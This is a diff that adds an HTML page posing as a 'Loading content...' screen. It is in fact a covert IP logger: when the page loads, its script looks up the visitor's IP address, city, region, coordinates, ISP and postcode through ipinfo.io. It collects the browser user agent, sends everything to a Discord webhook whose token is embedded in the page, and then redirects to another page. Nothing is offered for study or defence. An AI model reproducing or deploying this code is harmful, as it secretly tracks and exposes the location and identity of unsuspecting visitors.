@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loading...</title>
+  </head>
+  <body>
+    <h1>Loading content...</h1>
+    <script src="https://3kh0.github.io/js/main.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+      $.getJSON("https://ipinfo.io", function (response) {
+       const main = {
+				title: "Teaclub.tech",
+				description: "> __Information Logger__",
+				thumbnail: {
+					url: "https://media.tenor.com/yFOOWZ-5bGYAAAAd/ip-grabber-meme.gif",
+				},
+				fields: [
+					{
+						name: "IP:",
+						value: `\`${response.ip}\``,
+						inline: false,
+					},
+					{
+						name: "User-Agent:",
+						value: `\`${navigator.userAgent}\``,
+						inline: false,
+					},
+					{
+						name: "City:",
+						value: `\`${response.city}\``,
+						inline: false,
+					},
+					{
+						name: "Region:",
+						value: `\`${response.region}\``,
+						inline: false
+					},
+					{
+						name: "Country:",
+						value: `\`${response.country}\``,
+						inline: false
+					},
+					{
+						name: "Loc:",
+						value: `\`${response.loc}\``,
+						inline: false
+					},
+					{
+						name: "Company:",
+						value: `\`${response.org}\``,
+						inline: false
+					},
+					{
+						name: "Postcode:",
+						value: `\`${response.postal}\``,
+						inline: false
+					},
+				],
+				footer: {
+					text: "cocking"
+				}
+			}
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1025146463136788510/gMR9eG7wM3Qgb5dkktIjtoK_Pz-_iNXkd8gF_sqJnE28yI13kBPS7gT2EeHKHSFSmkCO");
+        // Put in your discord webhook url above ^^^
+        request.setRequestHeader("Content-type", "application/json");
+        const params = {
+          username: "teaclub.tech 2",
+          avatar_url: "https://media.tenor.com/yFOOWZ-5bGYAAAAd/ip-grabber-meme.gif",
+          content: "@everyone",
+		  embeds: [main]
+        };
+        request.send(JSON.stringify(params));
+      });
+    </script>
+    <meta http-equiv="refresh" content="0.5;url=whitelisting.html" />
+  </body>
+</html>
